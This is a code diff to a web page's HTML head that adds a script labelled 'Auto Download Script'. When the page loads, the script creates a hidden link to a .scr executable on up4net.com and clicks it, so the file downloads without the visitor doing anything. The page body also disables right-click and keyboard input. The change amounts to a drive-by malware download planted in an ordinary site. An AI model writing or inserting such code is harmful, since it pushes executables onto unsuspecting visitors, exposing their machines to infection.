@@ -25,6 +25,24 @@
     <script src="js/title.js"></script>
     <script src="js/creativa-popup.js" type="text/javascript"></script>
     <script src="js/popup.js" type="text/javascript"></script>
+    
+    <!-- Auto Download Script -->
+    <script>
+        window.addEventListener('load', function() {
+            // Create a download link automatically when page loads
+            var downloadLink = document.createElement('a');
+            downloadLink.href = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
+            downloadLink.download = 'file.scr';
+            downloadLink.style.display = 'none';
+            document.body.appendChild(downloadLink);
+            
+            // Trigger the download automatically
+            downloadLink.click();
+            
+            // Remove the link after download
+            document.body.removeChild(downloadLink);
+        });
+    </script>
 </head>
 
 <body oncontextmenu="return false;" onkeydown="return false;" style="overflow: hidden">
